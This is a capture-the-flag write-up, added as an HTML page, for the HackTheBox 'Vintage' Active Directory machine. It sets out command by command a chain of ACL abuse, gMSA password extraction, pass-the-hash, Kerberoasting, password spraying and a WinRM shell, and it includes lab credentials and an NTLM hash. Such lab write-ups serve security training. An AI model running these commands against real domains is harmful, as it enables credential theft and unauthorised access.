@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <title>Vintage HTB: Abusing Pre-Windows 2000 Compatible Access and gMSA Password Retrieval — Satej Chaudhari</title>
+  <meta name="description" content="A walkthrough of Vintage HTB covering Kerberos authentication, BloodHound enumeration, gMSA password extraction, ACL abuse, Kerberoasting, and privilege escalation through Active Directory misconfigurations.">
+
+  <link rel="icon" type="image/svg+xml" href="../assets/img/favicon.svg">
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+
+  <link rel="stylesheet" href="../assets/css/style.css">
+</head>
+<body>
+
+<header class="site-header">
+  <div class="wrap-wide">
+    <a class="brand" href="../index.html">
+      <span class="brand-mark">SC</span>
+      <span class="brand-name">Satej Chaudhari</span>
+    </a>
+
+    <nav class="site-nav">
+      <a href="../index.html">Home</a>
+      <a href="../writeups.html">Writeups</a>
+      <a href="../blog.html">Blog</a>
+      <a href="../toolkit.html">Toolkit</a>
+      <a href="https://github.com/yourusername" target="_blank" rel="noopener" class="nav-external">GitHub</a>
+    </nav>
+
+    <button class="nav-toggle" aria-label="Toggle menu" aria-expanded="false">
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
+        <line x1="3" y1="6" x2="21" y2="6"></line>
+        <line x1="3" y1="12" x2="21" y2="12"></line>
+        <line x1="3" y1="18" x2="21" y2="18"></line>
+      </svg>
+    </button>
+  </div>
+</header>
+
+<main class="wrap post">
+  <a class="post-back" href="../writeups.html">&larr; back to writeups</a>
+
+  <article>
+    <header class="post-header">
+      <span class="tag">AD</span>
+
+      <h1 class="post-title">
+        Vintage HTB: Abusing Pre-Windows 2000 Compatible Access and gMSA Password Retrieval
+      </h1>
+
+      <p class="post-meta">
+        <time datetime="2026-07-03">2026-07-03</time>
+        <span>&middot; 12 min read</span>
+      </p>
+    </header>
+
+    <div class="post-body">
+
+      <p>
+        Vintage is an Active Directory machine that focuses on Kerberos authentication,
+        legacy group memberships, gMSA abuse, delegated ACLs, and Kerberoasting.
+        Starting with a standard domain user account, the attack path leverages
+        Pre-Windows 2000 Compatible Access to obtain control of a computer account,
+        extract a gMSA password, abuse ServiceManagers permissions, Kerberoast a
+        service account, and ultimately obtain a user shell.
+      </p>
+
+      <blockquote>
+        <strong>Attack Path</strong><br><br>
+        p.rosa → FS01$ → GMSA01$ → ServiceManagers → svc_sql → Kerberoast → c.neri → WinRM
+      </blockquote>
+
+      <h2>Initial Enumeration</h2>
+
+      <p>
+        The provided credentials were:
+      </p>
+
+      <pre><code>Username: p.rosa
+Password: Rosaisbest123
+Domain: vintage.htb
+IP: 10.10.11.45</code></pre>
+
+      <p>
+        Initial testing showed that NTLM authentication was not accepted,
+        requiring Kerberos-based authentication for further enumeration.
+      </p>
+
+      <figure>
+        <img src="../assets/img/vintage/image-1.png" alt="Initial authentication testing">
+        <figcaption>Authentication testing against LDAP.</figcaption>
+      </figure>
+
+      <h2>Configuring Kerberos</h2>
+
+      <p>
+        Before interacting with the domain, Kerberos was configured locally by
+        updating the hosts file, synchronizing time, and requesting a TGT.
+      </p>
+
+      <pre><code>echo "10.10.11.45 dc01.vintage.htb vintage.htb dc01" | sudo tee -a /etc/hosts
+
+sudo net time set -S vintage.htb
+
+echo 'Rosaisbest123' | kinit p.rosa
+klist</code></pre>
+
+      <figure>
+        <img src="../assets/img/vintage/image-2.png" alt="Kerberos ticket">
+        <figcaption>Successfully obtaining a TGT as p.rosa.</figcaption>
+      </figure>
+
+      <h2>BloodHound Enumeration</h2>
+
+      <p>
+        BloodHound collection was performed using both BloodHound CE and NetExec.
+      </p>
+
+      <pre><code>bloodhound-ce-python -c All \
+-d vintage.htb \
+-u 'P.Rosa' \
+-p 'Rosaisbest123' \
+-ns 10.10.11.45 \
+--zip</code></pre>
+
+      <pre><code>nxc ldap DC01.vintage.htb \
+-d vintage.htb \
+-u p.rosa \
+-p Rosaisbest123 \
+--bloodhound \
+-c All \
+--dns-server 10.10.11.45</code></pre>
+
+      <figure>
+        <img src="../assets/img/vintage/image-3.png" alt="BloodHound collection">
+        <figcaption>Collecting BloodHound data using NetExec.</figcaption>
+      </figure>
+
+      <figure>
+        <img src="../assets/img/vintage/image-4.png" alt="BloodHound enumeration">
+        <figcaption>BloodHound CE enumeration output.</figcaption>
+      </figure>
+
+      <h2>Abusing Pre-Windows 2000 Compatible Access</h2>
+
+      <p>
+        BloodHound revealed that computer accounts inherited membership through
+        the Pre-Windows 2000 Compatible Access group.
+      </p>
+
+      <figure>
+        <img src="../assets/img/vintage/image-5.png" alt="Pre Windows 2000 Compatible Access">
+        <figcaption>FS01$ inherits access through the legacy compatibility group.</figcaption>
+      </figure>
+
+      <p>
+        Testing the hostname as the password for the computer account resulted in
+        successful authentication.
+      </p>
+
+      <pre><code>echo 'fs01' | kinit 'fs01$'
+klist</code></pre>
+
+      <figure>
+        <img src="../assets/img/vintage/image-6.png" alt="FS01 ticket">
+        <figcaption>Kerberos ticket obtained as FS01$.</figcaption>
+      </figure>
+
+      <h2>Reading the gMSA Password</h2>
+
+      <p>
+        Further BloodHound analysis showed that FS01$ possessed
+        ReadGMSAPassword permissions over GMSA01$.
+      </p>
+
+      <figure>
+        <img src="../assets/img/vintage/image-7.png" alt="ReadGMSAPassword">
+        <figcaption>FS01$ can read the managed password of GMSA01$.</figcaption>
+      </figure>
+
+      <pre><code>bloodyAD -d vintage.htb -k \
+--host dc01.vintage.htb \
+get object \
+"CN=GMSA01,CN=MANAGED SERVICE ACCOUNTS,DC=VINTAGE,DC=HTB" \
+--attr msDS-ManagedPassword</code></pre>
+
+      <figure>
+        <img src="../assets/img/vintage/image-8.png" alt="gMSA password extraction">
+        <figcaption>Extracting the managed password and NTLM hash.</figcaption>
+      </figure>
+
+      <h2>Authenticating as GMSA01$</h2>
+
+      <p>
+        The extracted NTLM hash can be used to authenticate as the gMSA account.
+      </p>
+
+      <pre><code>ktutil
+
+addent -p GMSA01$ -k 1 -key -e rc4-hmac
+wkt /tmp/GMSA01.keytab
+
+kinit -V -k -t /tmp/GMSA01.keytab -f 'GMSA01$'</code></pre>
+
+      <figure>
+        <img src="../assets/img/vintage/image-9.png" alt="Keytab authentication">
+        <figcaption>Creating a keytab and obtaining a Kerberos ticket.</figcaption>
+      </figure>
+
+      <p>
+        An alternative approach is using Impacket directly.
+      </p>
+
+      <pre><code>impacket-getTGT \
+-hashes :c3e2d44f1a108288b0906a796587ddee \
+-dc-ip 10.10.11.45 \
+'VINTAGE/GMSA01$'</code></pre>
+
+      <figure>
+        <img src="../assets/img/vintage/image-10.png" alt="Impacket getTGT">
+        <figcaption>Obtaining a TGT using the extracted NTLM hash.</figcaption>
+      </figure>
+
+      <h2>Abusing ServiceManagers</h2>
+
+      <p>
+        BloodHound showed that GMSA01$ possessed AddSelf permissions over the
+        ServiceManagers group.
+      </p>
+
+      <pre><code>bloodyAD -d vintage.htb -k \
+--host dc01.vintage.htb \
+add groupMember ServiceManagers 'GMSA01$'</code></pre>
+
+      <figure>
+        <img src="../assets/img/vintage/image-11.png" alt="AddSelf abuse">
+        <figcaption>Adding GMSA01$ to ServiceManagers.</figcaption>
+      </figure>
+
+      <figure>
+        <img src="../assets/img/vintage/image-12.png" alt="GenericAll permissions">
+        <figcaption>ServiceManagers possesses GenericAll over multiple service accounts.</figcaption>
+      </figure>
+
+      <h2>Creating a Kerberoastable Account</h2>
+
+      <p>
+        The svc_sql account was disabled and did not have a Service Principal Name.
+        Using GenericAll permissions, both issues were corrected.
+      </p>
+
+      <pre><code>bloodyAD -d vintage.htb -k \
+remove uac svc_sql -f ACCOUNTDISABLE
+
+bloodyAD -d vintage.htb -k \
+set object svc_sql servicePrincipalName \
+-v 'http/anything'</code></pre>
+
+      <figure>
+        <img src="../assets/img/vintage/image-13.png" alt="Enable svc_sql">
+        <figcaption>Enabling svc_sql and assigning an SPN.</figcaption>
+      </figure>
+
+      <h2>Kerberoasting svc_sql</h2>
+
+      <pre><code>netexec ldap 10.10.11.45 \
+-d vintage.htb \
+-u 'GMSA01$' \
+-H 'c3e2d44f1a108288b0906a796587ddee' \
+-k \
+--kerberoasting hashes.txt</code></pre>
+
+      <figure>
+        <img src="../assets/img/vintage/image-14.png" alt="Kerberoasting">
+        <figcaption>Requesting a TGS ticket for the newly configured service account.</figcaption>
+      </figure>
+
+      <pre><code>john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt</code></pre>
+
+      <figure>
+        <img src="../assets/img/vintage/image-15.png" alt="Cracked password">
+        <figcaption>Recovering the password from the Kerberoasted ticket.</figcaption>
+      </figure>
+
+      <p>
+        Recovered password:
+      </p>
+
+      <pre><code>Zer0the0ne</code></pre>
+
+      <h2>Password Spraying</h2>
+
+      <p>
+        The password was known, but the corresponding account still needed to be
+        identified.
+      </p>
+
+      <pre><code>netexec ldap 10.10.11.45 \
+-d vintage.htb \
+-u 'GMSA01$' \
+-H 'c3e2d44f1a108288b0906a796587ddee' \
+-k \
+--users</code></pre>
+
+      <figure>
+        <img src="../assets/img/vintage/image-16.png" alt="User enumeration">
+        <figcaption>Enumerating domain users.</figcaption>
+      </figure>
+
+      <pre><code>netexec ldap 10.10.11.45 \
+-d vintage.htb \
+-u users.txt \
+-p 'Zer0the0ne' \
+-k</code></pre>
+
+      <figure>
+        <img src="../assets/img/vintage/image-17.png" alt="Password spray">
+        <figcaption>Password spraying identifies a valid user.</figcaption>
+      </figure>
+
+      <p>
+        The recovered password belonged to:
+      </p>
+
+      <pre><code>c.neri</code></pre>
+
+      <h2>Obtaining a User Shell</h2>
+
+      <p>
+        BloodHound showed that c.neri was a member of Remote Management Users,
+        making WinRM access possible.
+      </p>
+
+      <figure>
+        <img src="../assets/img/vintage/image-18.png" alt="Group membership">
+        <figcaption>Group memberships associated with c.neri.</figcaption>
+      </figure>
+
+      <pre><code>echo 'Zer0the0ne' | kinit c.neri
+
+evil-winrm \
+-i dc01.vintage.htb \
+-r vintage.htb</code></pre>
+
+      <figure>
+        <img src="../assets/img/vintage/image-19.png" alt="User shell">
+        <figcaption>Interactive shell obtained via WinRM.</figcaption>
+      </figure>
+
+      <h2>Conclusion</h2>
+
+      <p>
+        Vintage demonstrates how multiple seemingly minor Active Directory
+        misconfigurations can combine into a complete attack chain.
+        Starting with a standard domain user, the path leveraged legacy
+        computer account access, gMSA password retrieval, delegated ACL abuse,
+        Kerberoasting, and password reuse to gain interactive access within
+        the environment.
+      </p>
+
+      <p>
+        The most interesting aspect of this machine is how each individual
+        privilege appears low impact in isolation, yet chaining them together
+        results in a straightforward path to compromise.
+      </p>
+
+    </div>
+  </article>
+</main>
+
+<footer class="site-footer">
+  <div class="wrap-wide">
+    <p>&copy; 2026 Satej Chaudhari</p>
+    <div class="footer-links">
+      <a href="../writeups.html">Writeups</a>
+      <a href="../blog.html">Blog</a>
+      <a href="../toolkit.html">Toolkit</a>
+    </div>
+  </div>
+</footer>
+
+<script src="../assets/js/main.js"></script>
+</body>
+</html>
